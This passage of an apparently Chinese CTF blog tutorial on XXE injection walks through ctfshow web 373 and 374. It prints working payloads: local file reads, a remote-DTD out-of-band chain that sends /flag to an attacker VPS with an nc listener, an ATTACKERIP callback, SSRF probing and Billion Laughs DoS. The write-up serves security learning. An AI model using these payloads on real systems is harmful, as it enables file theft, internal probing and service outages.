$creds-&gt;ctfshow;</code> - 从XML数据中提取ctfshow元素的值。</li><li><code>echo $ctfshow;</code> - 将ctfshow元素的值输出到页面上。</li><li><code>highlight_file(__FILE__);</code> - 在页面上高亮显示当前PHP文件的源代码。</li></ol><p>贴个payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Ed3n [</span><br><span class="line">&lt;!ELEMENT Ed3n ANY&gt;</span><br><span class="line">&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ed3n&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;payload;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/Ed3n&gt;</span><br></pre></td></tr></table></figure><p><img src="/picture/YxXB7c3PtpydFEr.png" alt="image-20240311181553404"></p><p>但我看到了 K0rz3n 佬读取复杂文件名的操作，感觉分别可以应用在读取Linux和Windows的flag上。</p><p>以下为主要内容摘要：</p><blockquote><blockquote><p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <code>&lt; &gt; &amp; &quot;</code>  字符，CDATA 元素中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure><p>可以输入任意字符除了 <code>]]&gt;</code> 不能嵌套<br>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA 包起来</p></blockquote><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p><p>首先，找到问题出现的地方，问题出现在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;...</span><br><span class="line">&gt;&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>引用并不接受可能会引起 xml 格式混乱的字符（在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,&#39;</code>等。这些均需要对其进行转义，否则会对XML解释器生成错误），我们想在引用的两边加上 <code>&quot;&lt;![CDATA[&quot;和 “]]&gt;”</code> ，但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt;&lt;!DOCTYPE roottag [</span><br><span class="line">  &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&gt;]&gt;</span><br><span class="line">&gt;&lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure><p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在xml 中调用，那么要想在 DTD 中拼接，我们知道我们只有一种选择，就是使用参数实体</p></blockquote><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure><p><strong>evil.dtd</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>解释：</p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>：指定XML版本为1.0，字符编码为UTF-8。</p><p><code>&lt;!DOCTYPE roottag [...]&gt;</code>：定义了名为”roottag”的根元素，并在内部包含了一组实体定义。</p><p><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code>：定义了名为”start”的参数实体，内容为”&lt;![CDATA[“，用于表示CDATA块的起始部分。</p><p><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code>：定义了名为”goodies”的参数实体，指向本地文件”d:&#x2F;test.txt”，用于引入外部实体内容。</p><p> <code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code>：定义了名为”end”的参数实体，内容为”]]&gt;”,用于表示CDATA块的结束部分。</p><p> <code>&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</code>：定义了名为”dtd”的参数实体，指向远程DTD文件”<code>http://ip/evil.dtd</code>“。<br> <code>%dtd;</code>：在DOCTYPE声明中引用了”dtd”参数实体，将远程DTD文件的内容插入到文档中。</p><p> <code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>：XML文档的根元素为”roottag”，其中引用了名为”all”的通用实体，从而达到拼接的目的。</p><p>第二个XML代码片段中的<code>evil.dtd</code>文件定义了一个名为<code>all</code>的通用实体，其内容为<code>%start;%goodies;%end;</code>，表示<code>all</code>实体由<code>start</code>、<code>goodies</code>和<code>end</code>三个实体组成。</p><h5 id="无回显读敏感文件："><a href="#无回显读敏感文件：" class="headerlink" title="无回显读敏感文件："></a>无回显读敏感文件：</h5><p>本题为 ctfshow web 374 题的源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>相比较于上一道有回显的题目，差别在于删除了如下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure><p>我们的做法是将flag外带</p><p><del>由于新人第一次接触反弹Shell的做法，就将接下来的步骤写的详细一些了</del></p><p>如果是腾讯云的vps，要现在防火墙将所有端口开放</p><p><img src="/picture/t3vQkyRPYEoSFOI.png" alt="image-20240313173756361"></p><p>启动vps后在特定宽口开放http服务，以便通过外网能访问到你的恶意文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure><p>此时我们访问一下 <a href="http://vps-ip:8000/">http://vps-ip:8000</a> 试试看：（未有特殊说明则默认开放8000端口，ip为vps公网的ip）</p><p><img src="/picture/q4QxSDGbpXnMOEv.png" alt="image-20240313153456749"></p><p>此时</p><p><img src="/picture/AyUs89x3OrngBFe.png" alt="image-20240313154259477"></p><p>说明8000端口启动http服务成功</p><p>同理我们来测试1234端口：</p><p><img src="/picture/A6UcgXZFuofS2Bv.png" alt="image-20240313154326926"></p><p>说明1234端口也启动http服务成功</p><p>创建XXE.dtd文件并写入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim XXE.dtd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#XXE.dtd</span><br><span class="line">#shift+i</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">#esc</span><br><span class="line">#shift+: 输入wq保存退出</span><br></pre></td></tr></table></figure><p>在另一个页面监听本地1234端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><p><img src="/picture/czXb29IgDC4wZFL.png" alt="image-20240313154810747"></p><p>burp发包内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 2299db75-d9fe-416f-959d-406b131ae701.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/picture/G4Q5JhVHnozk1M6.png" alt="image-20240313161738958"></p><p>在监听的页面就可以看到加密后的flag</p><p><img src="/picture/R24VpE8F6yLnZdC.png" alt="image-20240313155739020"></p><p>解密后得到flag</p><p><img src="/picture/VBZqvXIb3kepYiA.png" alt="image-20240313155848778"></p><p>对payload的解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>定义了两个实体：</p><ol><li><p><code>%file</code>：它使用php过滤器读取系统文件<code>/flag</code>的内容，并对内容进行base64编码。</p></li><li><p><code>%dtd</code>：它从远程URL <code>http://vps-ip:8000/XXE.dtd</code>加载DTD文件。</p></li></ol><p>以下是jay17师傅的解释（实体名有所改动）：</p><ol><li>不能直接<code>&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/%file&quot;&gt; </code>，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制</li><li><code>%dtd;</code>会读取远程dtd文件，读到了以后，因为远程dtd文件有一个<code>% all</code>实体的定义，那么就会解析这个实体定义。<code>% all</code>实体的定义内容是另外一个实体<code>% send</code>定义，那就会解析<code>% send</code>，就会执行远程请求，请求地址<code>http://vps-ip:8000/%file</code>，会在我们的 vps 日志上留下痕迹。<br>也可以起 nc 监听端口，能判断是否有向我们的 vps 发送请求以及请求内容。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><ol><li><code>&amp;#x25;</code> 就是百分号，因为是嵌套在里面的引用，不能直接写百分号</li><li><code>%all</code>实体定义了一个新的实体<code>send</code>，其内容是一个SYSTEM类型的实体，用于发送数据到指定的URL。在这里，<code>%file</code>实体被引用在URL中，以便将<code>/flag</code>文件的内容发送到指定的<code>http://vps-ip:1234/</code>地址。</li><li>在XML文档的解析过程中，通过引用<code>%all</code>实体，实际上定义了一个名为<code>send</code>的实体，其值是将<code>/flag</code>文件内容发送到指定URL的操作。</li><li>最后，通过引用<code>%send</code>实体，实际上执行了之前定义的<code>send</code>实体，将<code>/flag</code>文件的内容发送到指定的URL。</li></ol><h3 id="XXE检测："><a href="#XXE检测：" class="headerlink" title="XXE检测："></a>XXE检测：</h3><p>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</p><p>首先检测XML是否会被成功解析：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/picture/zScwHxmoaDt2hqJ.png" alt="image-20231008194425489"></p><p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p><p><img src="/picture/WV5Z1hPgBNuRQU3.png" alt="image-20231008194500250"></p><p>接下来检测该端点是否支持DTD引用外部实体：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>此时通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的HTTP request。</p><p><img src="/picture/OxmH3Qjp9ahRWPK.png" alt="image-20231008210523538"></p><p>如图所示，则该处很可能存在XML外部实体注入漏洞。</p><h3 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h3><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p><p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的“瑞士军刀”</p><p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p><p>之后便可使用以下语句尝试是否能够建立连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:8081/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure><h3 id="DDoS："><a href="#DDoS：" class="headerlink" title="DDoS："></a>DDoS：</h3><p>支持实体测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p><h3 id="Billion-Laughs-攻击："><a href="#Billion-Laughs-攻击：" class="headerlink" title="Billion Laughs 攻击："></a>Billion Laughs 攻击：</h3><p>一个经典的Dos攻击payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        ...... </span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>当XML解析器加载该文档时，它会看到它包含一个根元素 “lolz” ，该元素包含文本 “&lol9;” 。然而，“&lol9;” 是一个已定义的实体，它扩展为包含十个 “&lol8;” 字符串。每个 “&lol8;” 字符串都是一个已定义的实体，可以扩展到10个 “&lol7;” 字符串，以此类推。在处理完所有的实体扩展之后，这个小（小于1 KB）的XML块实际上将包含 109 &#x3D; 10亿个 “lol” ，占用了将近 3 gb 的内存。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD 简介 (w3school.com.cn)</a></p><p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUhG+KG=DceorD3D&alichlgref=https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/389550468">XXE知识总结，有这篇就够了！ - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/Jayjay___/article/details/132146130">Ctfshow web入门 XXE 模板注入篇 web373-web378 详细题解 全_ctfshow web373-CSDN博客</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/134641792">【Web】CTFSHOW XXE刷题记录(全)-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
            <tag> ctfshow </tag>
            
            <tag> reverse shell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
